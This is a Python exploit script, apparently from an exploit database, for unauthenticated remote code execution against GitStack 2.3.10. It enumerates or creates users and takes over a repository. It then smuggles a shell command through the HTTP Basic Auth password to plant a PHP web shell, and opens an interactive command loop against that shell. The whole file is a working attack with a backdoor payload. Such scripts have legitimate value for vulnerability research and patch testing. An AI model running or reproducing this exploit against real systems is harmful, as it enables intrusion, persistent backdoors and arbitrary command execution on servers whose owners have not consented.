#Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 2024.6.27
# By: Lakshan Sameera(trexthedino)
# Category: remote 

import requests
from requests.auth import HTTPBasicAuth
import os
import sys

ip = 'xxx.xxx.xxx.xxx'

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

print("[+] Get user list")
try:
    r = requests.get("http://{}/rest/user/".format(ip))
    user_list = r.json()
    user_list.remove('everyone')
except:
    pass

if len(user_list) > 0:
    username = user_list[0]
    print("[+] Found user {}".format(username))
else:
    r = requests.post("http://{}/rest/user/".format(ip), data={'username': username, 'password': password})
    print("[+] Create user")

    if not "User created" in r.text and not "User already exist" in r.text:
        print("[-] Cannot create user")
        os._exit(0)

r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
    print("[+] Web repository already enabled")
else:
    print("[+] Enable web repository")
    r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
    if not "Web interface successfully enabled" in r.text:
        print("[-] Cannot enable web interface")
        os._exit(0)

print("[+] Get repositories list")
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
    repository = repository_list[0]['name']
    print("[+] Found repository {}".format(repository))
else:
    print("[+] Create repository")

    r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken': csrf_token}, data={'name': repository, 'csrfmiddlewaretoken': csrf_token})
    if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
        print("[-] Cannot create repository")
        os._exit(0)

print("[+] Add user to repository")
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
    print("[-] Cannot add user to repository")
    os._exit(0)

print("[+] Disable access for anyone")
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
    print("[-] Cannot remove access for anyone")
    os._exit(0)

print("[+] Create backdoor in PHP")
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\\GitStack\\gitphp\\exploit-trex.php')) #if you need you can change the exploit name here also change it below
print(r.text.encode(sys.stdout.encoding, errors='replace'))

while True:
    try:
        command = input("shell> ")
        if command.lower() in ["exit", "quit"]:
            break

        print("[+] Execute command")
        r = requests.post("http://{}/web/exploit-trex.php".format(ip), data={'a': command}) #if you change above exploit name, change also here
        print(r.text.encode(sys.stdout.encoding, errors='replace'))
    except KeyboardInterrupt:
        print("\nExiting...")
        break
    except Exception as e:
        print(f"Error: {e}")
        break
